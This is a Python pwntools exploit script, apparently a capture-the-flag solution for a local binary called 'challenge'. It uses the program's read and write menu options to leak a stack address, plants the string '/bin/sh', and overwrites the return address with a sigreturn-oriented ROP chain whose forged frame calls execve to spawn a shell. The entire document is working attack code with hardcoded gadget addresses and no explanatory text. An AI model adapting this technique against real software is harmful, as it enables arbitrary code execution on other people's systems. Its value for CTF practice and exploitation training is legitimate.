from pwn import *

elf = context.binary = ELF('./challenge', checksec=False)


p = process(elf.path)

def get_leak():
    p.sendline(b"1")
    p.recvuntil(b"Offset: ")
    p.sendline(str(20).encode())
    p.recvuntil(b"Size: ")
    p.sendline(str(8-1).encode())
    return p.recvline().strip()

def write_data(base,target, content):
    p.sendline(b"2")
    p.recvuntil(b"Offset: ")
    offset_addr = target - base
    p.sendline(str(offset_addr+0x110).encode())
    p.recvuntil(b"Value: ")
    p.sendline(content)



p.recvuntil(b"> ")
leak = get_leak()
leak = leak.split()[::-1]

base_leak = b"0x"

for x in leak:
    base_leak += hex(int(x, 10)).replace("0x", "").rjust(2, "0").encode()

base_leak = int(base_leak, 0)-32
ret_addr = base_leak + 7


info("BASE LEAK @%s" % hex(base_leak))
info("RET ADDR  @%s" % hex(ret_addr))

p.sendline(b"y")


write_data(base_leak, base_leak + 500, b"/bin/sh\0")

info("bin_sh @%s" % hex(base_leak + 501))

bin_sh = base_leak + 501

p.sendline(b"y")


pop_rax    = 0x0000000000414063
syscall    = 0x000000000040106e

frame = SigreturnFrame()
frame.rax = 0x3b            # execve
frame.rdi = bin_sh           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = 0x000000000040106e # syscall

rop = p64(pop_rax)+p64(15)+p64(syscall)+bytes(frame)

write_data(base_leak, ret_addr, rop)


p.sendline(b"echo PWNED")
p.interactive()